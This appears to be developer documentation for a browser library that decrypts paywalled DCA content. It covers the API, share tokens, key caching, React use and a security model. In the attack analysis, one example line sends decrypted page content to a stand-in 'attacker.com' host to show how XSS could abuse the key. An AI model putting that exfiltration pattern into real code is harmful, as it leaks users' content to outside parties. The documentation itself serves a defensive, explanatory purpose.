# Client Integration

The Capsule client is a lightweight browser library that handles DCA (Distributed Content Access) content decryption using the Web Crypto API. Publishers embed encrypted content and key metadata directly in the HTML, and keys are obtained from issuer endpoints.

## Installation

```bash
npm install @sesamy/capsule
```

## Quick Start (One-Liner)

The simplest integration -- auto-detects the issuer and share token, then decrypts and renders everything:

```ts
import { DcaClient, hasDcaContent } from '@sesamy/capsule';

if (hasDcaContent()) {
  const client = new DcaClient();
  const content = await client.processPage();
  client.renderToPage(content);
}
```

## Step-by-Step

For more control, use the individual methods:

```ts
import { DcaClient } from '@sesamy/capsule';

const client = new DcaClient();

// Parse DCA data from the current page
const page = client.parsePage();

// Unlock via an issuer
const keys = await client.unlock(page, 'sesamy');

// Decrypt a specific content item
const html = await client.decrypt(page, 'bodytext', keys);

// Inject into the DOM
document.querySelector('[data-dca-content-name="bodytext"]')!.innerHTML = html;

// Or decrypt everything at once
const all = await client.decryptAll(page, keys);
for (const [name, content] of Object.entries(all)) {
  document.querySelector(`[data-dca-content-name="${name}"]`)!.innerHTML = content;
}
```

## HTML Structure

DCA pages contain a single `<script class="dca-manifest">` element holding the v0.10 manifest -- both the wrapped ciphertext blocks and the issuer metadata live inside it:

```html
<!-- DCA manifest -->
<script class="dca-manifest" type="application/json">
{
  "version": "0.10",
  "resourceJWT": "eyJ...",
  "content": {
    "bodytext": {
      "contentType": "text/html",
      "iv": "...",
      "aad": "...",
      "ciphertext": "BASE64URL_CIPHERTEXT",
      "wrappedContentKey": [
        { "kid": "2026-04-15", "iv": "...", "ciphertext": "..." }
      ]
    }
  },
  "issuers": {
    "sesamy": { "unlockUrl": "https://api.sesamy.com/unlock", "keyId": "..." }
  }
}
</script>
```

## Configuration

```ts
interface DcaClientOptions {
  // Custom fetch function (e.g. to add auth headers)
  fetch?: typeof globalThis.fetch;

  // Custom unlock function -- replaces the default fetch-based unlock
  unlockFn?: (unlockUrl: string, body: unknown) => Promise<DcaUnlockResponse>;

  // Wrap key cache for reusing wrap keys across pages
  wrapKeyCache?: DcaWrapKeyCache | false;

  // Enable client-bound transport (RSA-OAEP key wrapping)
  clientBound?: boolean;

  // RSA key size for client-bound transport (default: 2048)
  rsaKeySize?: 2048 | 4096;

  // IndexedDB database name for RSA key pair storage (default: 'dca-keys')
  keyDbName?: string;

  // Check whether the user has access before attempting unlock
  accessCheck?: (publisherContentId: string) => Promise<DcaAccessResult | null>;

  // Called when accessCheck indicates no access (inject a paywall UI)
  paywallFn?: (publisherContentId: string | null, root: Document | Element) => void;
}

interface DcaWrapKeyCache {
  get(key: string): Promise<string | null>;
  set(key: string, value: string): Promise<void>;
}
```

## API Reference

### parsePage(root?)

Parse the DCA manifest (including wrapped ciphertext blocks) from the DOM.

```ts
const page = client.parsePage();
// Or from a specific container
const page = client.parsePage(document.getElementById('article'));
```

### parseJsonResponse(json)

Parse a DCA manifest from a JSON API response instead of the DOM.

```ts
const res = await fetch('/api/article/123');
const page = client.parseJsonResponse(await res.json());
```

### unlock(page, issuerName, additionalBody?)

Request key material from an issuer's unlock endpoint. Pass extra fields (e.g. auth tokens) via `additionalBody`.

```ts
const keys = await client.unlock(page, 'sesamy', {
  authToken: 'Bearer ...',
});
```

### decrypt(page, contentName, unlockResponse)

Decrypt a single content item. Supports both direct content keys and wrap-key delivery.

```ts
const html = await client.decrypt(page, 'bodytext', keys);
```

### decryptAll(page, unlockResponse)

Decrypt all content items and return a name -> content map.

```ts
const results = await client.decryptAll(page, keys);
// { bodytext: '<p>...</p>', sidebar: '<div>...</div>' }
```

### processPage(options?)

Convenience method that combines parse -> unlock -> decryptAll in a single call. Auto-detects the issuer (first key in `manifest.issuers`) and share token (from URL `?share=` parameter) unless overridden:

```ts
// Simplest usage -- auto-detect everything
const content = await client.processPage();

// With explicit options
const content = await client.processPage({
  issuerName: 'sesamy',         // override auto-detected issuer
  shareToken: null,             // skip share token detection
  root: someElement,            // scope DOM parsing
  additionalBody: { auth: '...' } // extra fields for unlock request
});
```

### renderToPage(content, root?)

Inject decrypted content into the DOM. Finds elements with matching `data-dca-content-name` attributes and sets their `innerHTML`. Returns a `Set` of content names that were rendered:

```ts
const content = await client.processPage();
const rendered = client.renderToPage(content);
console.log('Rendered:', [...rendered]); // ['bodytext', 'sidebar']
```

### getPublicKey()

Get the user's public key (client-bound mode). Creates keys automatically if they don't exist.

```ts
const publicKey = await client.getPublicKey();
// Returns: Base64-encoded SPKI public key
```

### hasKeyPair()

Check whether the client has an existing RSA key pair stored in IndexedDB.

```ts
const exists = await client.hasKeyPair();
```

### DcaClient.hasDcaContent(root?)

Static method. Checks whether the page (or a given root element) contains DCA content by looking for a `<script class="dca-manifest">` element. Also available as a standalone import:

```ts
import { hasDcaContent } from '@sesamy/capsule';

if (hasDcaContent()) {
  // Page has DCA content -- initialize client
}
```

### DcaClient.getShareTokenFromUrl(paramName?)

Static method. Extract a share token from the current URL query parameters.

```ts
import { DcaClient, parseShareToken } from '@sesamy/capsule';

// Standalone function (no client instance needed)
const shareToken = parseShareToken();

// Or via the static method
const shareToken = DcaClient.getShareTokenFromUrl();

// Or use a custom parameter name
const shareToken = DcaClient.getShareTokenFromUrl('token');
```

### DcaClient.getPublisherContentId(root?)

Static method. Extract the `publisher-content-id` attribute from the page.

```ts
const contentId = DcaClient.getPublisherContentId();
```

### observe(root?, options?)

Watch for dynamically added DCA manifests and auto-process them.

```ts
const observer = client.observe(document.body);
// Later: observer.disconnect();
```

## Share Link Token Handling

The client library provides utilities for working with DCA share link tokens -- publisher-signed ES256 JWTs that grant access to specific content without a subscription.

### Unlocking with a Share Token

Call `unlockWithShareToken()` instead of the normal `unlock()`. The share token is included in the unlock request body so the issuer can validate it:

```ts
import { DcaClient } from '@sesamy/capsule';

const client = new DcaClient();
const page = client.parsePage();

const shareToken = DcaClient.getShareTokenFromUrl();
if (shareToken) {
  // Unlock using share token as authorization
  const keys = await client.unlockWithShareToken(page, "sesamy", shareToken);
  const html = await client.decrypt(page, "bodytext", keys);
  document.querySelector('[data-dca-content-name="bodytext"]')!.innerHTML = html;
  
  // Clean the share token from the URL (cosmetic)
  const url = new URL(window.location.href);
  url.searchParams.delete("share");
  history.replaceState({}, "", url);
}
```

### How It Works Under the Hood

`unlockWithShareToken()` is a convenience wrapper around `unlock()`. It adds the `shareToken` field to the unlock request body so the issuer knows to use share-link authorization instead of subscription checks:

```text
// What unlockWithShareToken sends to the issuer:
POST /api/unlock
{
  "resourceJWT": "eyJ...",
  "keys": [
    { "contentName": "bodytext", "scope": "...", "contentKey": "..." }
  ],
  "shareToken": "eyJ..."    // <- Share link token added here
}

// The issuer verifies the share token signature (ES256, publisher-signed),
// validates claims (domain, resourceId, expiry, contentNames),
// then returns key material from the normal DCA manifest.
// No rotationSecret needed -- keys flow through the normal DCA channel.
```

### Security Notes

- The share token is an opaque ES256 JWT signed by the publisher -- the client does not verify its signature (the issuer does that)
- The token carries no key material -- it is purely an authorization grant
- Tokens are bearer credentials: anyone with the URL has access until expiry
- The issuer validates the token against its trusted-publisher key allowlist -- no new secrets needed

## Wrap Key Caching

DCA supports wrap keys -- keyed by `kid` -- that can decrypt content keys locally. Provide a cache to reuse them across page navigations. Entries are stored under `dca:wk:{scope}:{kid}`:

```ts
// Simple sessionStorage-based cache
const cache = {
  async get(key: string) {
    return sessionStorage.getItem(key);
  },
  async set(key: string, value: string) {
    sessionStorage.setItem(key, value);
  },
};

const client = new DcaClient({ wrapKeyCache: cache });

// First page: keys fetched from issuer, wrapKeys cached
const page1 = client.parsePage();
const keys1 = await client.unlock(page1, 'sesamy');
await client.decrypt(page1, 'bodytext', keys1);

// Next page: if the same kid is still referenced, no server call needed
const page2 = client.parsePage();
const keys2 = await client.unlock(page2, 'sesamy');
await client.decrypt(page2, 'bodytext', keys2); // Uses cached wrapKey
```

## React Integration

```tsx
import { useState, useEffect, useRef } from 'react';
import { DcaClient, DcaParsedPage } from '@sesamy/capsule';

export function useDcaContent() {
  const [content, setContent] = useState<Record<string, string> | null>(null);
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<Error | null>(null);
  const clientRef = useRef<DcaClient | null>(null);

  useEffect(() => {
    clientRef.current = new DcaClient();
  }, []);

  const handleUnlock = async () => {
    if (!clientRef.current) return;
    
    setIsLoading(true);
    setError(null);
    
    try {
      const decrypted = await clientRef.current.processPage();
      setContent(decrypted);
    } catch (err) {
      setError(err instanceof Error ? err : new Error('Unlock failed'));
    } finally {
      setIsLoading(false);
    }
  };

  return { content, isLoading, error, handleUnlock };
}

// Usage
function Article() {
  const { content, isLoading, error, handleUnlock } = useDcaContent();

  if (content) {
    return (
      <>
        {Object.entries(content).map(([name, html]) => (
          <div key={name} dangerouslySetInnerHTML={{ __html: html }} />
        ))}
      </>
    );
  }
  if (isLoading) return <p>Unlocking...</p>;
  if (error) return <p>Error: {error.message}</p>;
  
  return <button onClick={handleUnlock}>Unlock</button>;
}
```

## Security Model

### Private Key Protection (Client-Bound Mode)

When `clientBound: true` is enabled, the client generates an RSA-OAEP key pair and the **private key cannot be extracted from the browser**, even by the user or malicious JavaScript code.

#### How Non-Extractable Keys Work

When generating a key pair, the private key is stored with `extractable: false`:

```ts
const privateKey = await crypto.subtle.importKey(
  'jwk',
  privateKeyJwk,
  { name: 'RSA-OAEP', hash: 'SHA-256' },
  false,  // NOT extractable - enforced by browser engine
  ['unwrapKey']
);
```

This means:

- The key can be **used** for unwrapping content keys
- The key cannot be **exported** in any format (JWK, PKCS8, raw bytes)
- The key cannot be **copied** to another device or browser
- The key cannot be **downloaded** or sent to a server

#### What About IndexedDB Access?

Users and JavaScript code **can access IndexedDB** through DevTools or browser APIs:

```ts
// You CAN retrieve the key object
const db = await indexedDB.open('dca-keys');
const keyPair = await db.get('keypair', 'default');
console.log(keyPair.privateKey); 
// Output: CryptoKey {type: "private", extractable: false, ...}

// But you CANNOT export the key material
await crypto.subtle.exportKey('jwk', keyPair.privateKey);
// Error: "key is not extractable"

await crypto.subtle.exportKey('pkcs8', keyPair.privateKey);
// Error: "key is not extractable"

// Even this doesn't help
JSON.stringify(keyPair.privateKey);
// Returns: "{}" (empty object)

const blob = new Blob([keyPair.privateKey]);
// Creates: "[object CryptoKey]" (useless string)
```

The `CryptoKey` object in IndexedDB is just a **handle** or **reference** to the actual key material, which lives in the browser's secure crypto subsystem. Think of it like a key to a safe deposit box that only works inside the bank - you can use it there, but you can't take the contents home.

#### Attack Vector Analysis

| Attack Type | Can Extract Key? | Notes |
| --- | --- | --- |
| Server compromise | No | Key never sent to server |
| Network interception | No | Key never transmitted |
| XSS / malicious JS | No | Can use key, cannot export it |
| Browser DevTools | No | Can see object, not bytes |
| Database breach | No | No server-side key storage |
| User manual export | No | Browser prevents all export methods |

The **only** attack that works is using the key for its intended purpose:

```ts
// Malicious code CAN do this:
const content = await client.processPage();
await fetch('https://attacker.com', { 
  method: 'POST', 
  body: JSON.stringify(content)  // Send decrypted content (not the key!)
});
```

This is why **XSS protection** (Content Security Policy, input sanitization) remains critical - not to protect the key itself, but to prevent unauthorized **use** of the key.

### Additional Security Layers

- **AES-GCM Authentication**: 128-bit auth tags prevent tampering with encrypted content
- **Web Crypto API**: Uses hardware-accelerated cryptography when available (TPM, Secure Enclave)
- **Secure Context Requirement**: Web Crypto API only works over HTTPS or localhost
- **Origin Isolation**: IndexedDB is bound to the origin - other websites cannot access your keys

### Limitations and Trade-offs (Client-Bound Mode)

- **Key loss means re-unlock**: If a user clears browser data or switches devices, cached wrap keys are lost and must be re-fetched from the issuer
- **No cross-device sync**: Keys are tied to a single browser profile
- **XSS can still abuse keys**: Malicious code can decrypt content (though not steal keys)

Consider implementing Content Security Policy (CSP) to prevent XSS attacks.

## Browser Compatibility

Capsule requires the Web Crypto API, which is available in:

- Chrome 37+
- Firefox 34+
- Safari 11+
- Edge 79+

Note: Web Crypto API is only available in secure contexts (HTTPS or localhost).
